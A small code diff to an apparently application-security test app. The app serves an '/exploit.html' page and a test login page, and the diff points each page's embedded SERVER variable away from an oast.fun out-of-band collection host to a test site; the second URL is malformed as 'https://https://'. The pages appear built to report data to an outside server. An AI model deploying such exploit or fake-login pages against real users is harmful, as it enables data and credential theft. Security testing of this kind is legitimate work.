@@ -24,7 +24,7 @@ app.get("/exploit.html", (_req, res) => {
 <body>
 <p id="status">Starting...</p>
 <script>
-var SERVER = "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun";
+var SERVER = "https://appsec-test-website.onrender.com";
 
 function log(step) {
     document.getElementById("status").innerText = step;
@@ -136,7 +136,7 @@ function renderPage({ content, title = "Test Login Page Below" }) {
   <body>
   <p id="status" style="display:none;"></p>
   <script>
-      var SERVER = "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun";
+      var SERVER = "https://https://appsec-test-website.onrender.com";
       
       function log(step) {
           document.getElementById("status").innerText = step;
